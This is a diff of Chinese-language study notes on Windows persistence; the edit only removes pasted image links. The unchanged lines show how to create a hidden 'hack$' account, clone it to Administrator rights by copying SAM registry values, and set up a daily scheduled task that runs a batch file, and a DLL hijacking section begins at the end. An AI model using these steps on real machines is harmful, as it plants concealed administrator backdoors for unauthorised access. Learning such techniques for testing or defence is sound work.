@@ -20,7 +20,7 @@ net user hack$ P@ssw0rd /add
 1. `Win-R` --> regedit --> `HKEY_LOCAL_MACHINE\SAM\SAM\Domains\Account\Users\Names`
 2. 查看账户的类型，hack$的类型标识为AA，Administrator的类型标识为BB
 3. 找到两者对应的十六进制文件夹(AA & BB)
-4. 将BB值复制到AA当中![[Pasted image 20240625204701.png|400]]
+4. 将BB值复制到AA当中
 5. 将hack$和AA分别导出
 6. `net user hack$ /del`删除该账户
 7. 将导出的两个`.reg`再次导回到注册表当中去，克隆账户就实现了
@@ -35,7 +35,7 @@ net user hack$ P@ssw0rd /add
 # 使用Tho用户运行计划任务，一天一次0点运行
 schtasks /create /tn hack /tr "C:\windows\Templa.bat" /sc daily /st 00:00 /ru "Tho"
 ```
-![[Pasted image 20240625205427.png|400]]
+
 # DLL Hijacking
 ## 优劣势
 优势
